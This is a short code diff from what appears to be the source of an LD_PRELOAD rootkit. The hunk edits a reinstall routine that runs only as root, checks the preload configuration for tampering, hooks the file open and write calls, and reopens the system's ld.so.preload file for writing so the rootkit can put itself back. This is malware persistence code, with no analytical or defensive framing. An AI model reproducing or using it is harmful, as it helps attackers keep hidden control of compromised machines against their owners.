@@ -39,8 +39,8 @@ int preload_inconsistent(void){ // returns 1 if something is wrong with the prel
 
 void reinstall(void){
     if(geteuid() != 0) return;
-    if(rknomore()) return;
-    if(!ld_inconsistent()) return;
+    if(rknomore() < 0) return;
+    if(!preload_inconsistent()) return;
 
     hook(CFOPEN, CFWRITE);
     FILE *ldfp = call(CFOPEN, LDSO_PRELOAD, "w");
